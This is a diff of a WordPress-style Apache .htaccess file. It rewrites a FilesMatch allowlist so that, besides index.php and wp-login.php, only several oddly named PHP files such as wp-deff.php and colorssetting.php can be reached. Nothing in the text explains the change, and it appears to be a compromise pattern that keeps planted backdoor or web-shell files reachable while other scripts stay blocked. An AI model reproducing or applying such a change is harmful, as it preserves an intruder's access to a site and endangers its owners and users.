@@ -3,7 +3,7 @@ Order allow,deny
 Deny from all
 </FilesMatch>
 
-<FilesMatch "^(index.php|wp-login.php|wp-admin.php|wp-mailers.php)$">
+<FilesMatch "^(index.php|wp-login.php|wp-admin.php|EntitiesConfig.php|WidgetSetting.php|wp-deff.php|locale.php|userprofileconfig.php|colorssetting.php)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
